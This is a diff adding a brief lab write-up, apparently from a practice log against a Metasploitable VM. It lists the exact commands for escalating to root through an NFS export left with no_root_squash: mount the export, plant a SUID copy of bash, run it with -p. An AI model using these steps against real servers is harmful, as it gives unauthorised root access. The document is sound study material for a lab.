@@ -1,0 +1,16 @@
+## Day 09 - NFS no_root_squash Root
+
+**Target:** 192.168.56.101:/ (exported as / *)
+
+**Steps:**
+1. showmount -e 192.168.56.101
+2. sudo mkdir -p /tmp/mnt
+3. sudo mount -t nfs 192.168.56.101:/ /tmp/mnt -o nolock
+4. ls /tmp/mnt -> confirms full filesystem mounted
+5. Initial attempt with `cp /bin/bash` failed - arch mismatch (Kali 64-bit vs Metasploitable 32-bit i686)
+6. Fixed: sudo cp /tmp/mnt/bin/bash /tmp/mnt/tmp/rootbash
+7. sudo chmod +xs /tmp/mnt/tmp/rootbash
+8. On victim: /tmp/rootbash -p
+9. id shows euid=0(root)
+
+**Root Cause:** NFS export / with no_root_squash - remote root user keeps root privileges, allows SUID creation.
